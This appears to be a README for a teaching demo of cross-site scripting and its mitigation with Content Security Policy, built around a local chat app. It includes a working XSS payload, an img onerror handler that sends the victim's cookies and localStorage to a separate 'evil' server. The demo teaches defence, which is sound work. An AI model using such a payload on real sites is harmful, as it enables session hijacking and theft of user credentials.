# Cross-Site Scripting & Content Security Policy Demo

## Setup

Open a terminal and navigate to the project's root directory.

1. `yarn install`
2. `yarn start:server`
3. In a separate terminal (same directory): `yarn start:client`
4. In a separate terminal (same directory): `yarn start:evil`

## Demonstrate the vulnerability

1. Open the chat app at [http://localhost:4000?user=Bob](http://localhost:4000?user=Bob) in your browser window.
2. Open the chat app at [http://localhost:4000?user=Alice](http://localhost:4000?user=Alice) in an incognito/private window (to make sure cookies are not shared between the two windows).
3. Paste the following malicious message in the chat and press "Send":

```
How's it going? <img style="display:none;" src="http://url.to.file.which/not.exist" onerror="javascript:fetch('http://localhost:5000', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ localStorage: Object.entries(localStorage).map(e => `${e[0]}=${e[1]}`), cookies: document.cookie })}); alert(`I just stole your auth cookie ${document.cookie} and the contents of your localStorage ${Object.entries(localStorage).map(e => `${e[0]}=${e[1]}`)}`);">
```

4. Check the terminal that's running `evilServer.js` - You'll see both the sender (attacker) and recipient's cookies and localStorage have been stolen and logged!

## Demonstrate the fix with Content Security Policy

1. Close both chat app windows.
2. Open fixed versions at [http://localhost:4000/secure?user=Bob](http://localhost:4000/secure?user=Bob) in your browser window and [http://localhost:4000/secure?user=Alice](http://localhost:4000/secure?user=Alice) in an incognito/private window.
3. Send the malicious message again.
4. Note that although the malicious message was delivered to the recipient, the browser blocked the script execution, image loading, and inline styles. Checking the terminal running `evilServer.js` reveals that the attacker didn't receive any information.
